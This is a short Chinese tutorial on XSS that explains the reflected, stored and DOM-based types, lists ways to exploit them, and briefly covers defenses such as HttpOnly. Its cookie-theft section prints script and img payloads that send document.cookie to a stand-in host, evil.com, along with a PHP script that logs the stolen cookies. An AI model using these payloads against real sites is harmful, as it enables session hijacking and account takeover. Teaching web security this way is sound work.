## 简介

XSS攻击，全称Cross Site Script攻击。通常是指黑客通过“HTML”注入篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。一般分为**反射型XSS**、**存储型XSS**和**基于DOM的XSS**。

1. **反射型XSS**：通常由黑客构造一个恶意的url，通过诱使用户点击实现攻击目的。
2. **存储型XSS**：黑客将恶意代码以博客或者其他形式存储到服务器上，每当其他用户浏览该内容时就会受到攻击。
3. **基于DOM的XSS**：这种XSS并不以“数据是否保存在服务器上”作为分类标准。从效果上，他是一种反射型XSS，但由于其独特的形成原因而单独列出。前端页面提供了用户修改DOM节点的功能，而用户通过输入攻击Payload达到插入脚本的目的，从而可以进一步实施更深入的攻击。

## XSS利用姿势

#### 1. Cookie窃取

可以使用下面的姿势将受害者cookie以GET的姿势发送到服务器上：

```js
<script>
document.location="http://www.evil.com/cookie.asp?cookie="+document.cookie
new Image().src="http://www.evil.com/cookie.asp?cookie="+document.cookie
</script>
<img src="http://www.evil.com/cookie.asp?cookie="+document.cookie></img>
```

远程服务器可以由配套接收cookie的服务器文件：

```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>
```

#### 2. 构造POST或者GET请求

利用插入在用户页面的XSS Payload，以用户的身份发送GET或者POST请求。Javascript可以发送GET、POST类型的请求，POST类型的请求也可以通过AJAX\(XMLHttpRequest或者ActiveXObject\)的方式发送。

#### 3. 钓鱼

#### 4. 挂马

#### 5. DOS或者DDOS

#### 6. XSS蠕虫

## 攻击姿势

通过XSS攻击，攻击者能够在用户当前浏览的页面中植入恶意脚本，并进而控制用户浏览器。这些脚本可以被称为攻击Payload。

###### 

## XSS防御

### 1. HttpOnly

可以对Cookie设置HttpOnly属性，从而禁止JavaScript对该类型Cookie的访问，从而防止了攻击者利用XSS窃取用户Cookie。

然而除了对Cookie的利用之外，XSS还有很多其他的利用手段。

### 2. 输入检查

### 3. 输出检查

> 参考：
>
> 1. 《白帽子讲Web安全》
> 2. [CTF-wiki: XSS cross-site scripting attack](https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/)



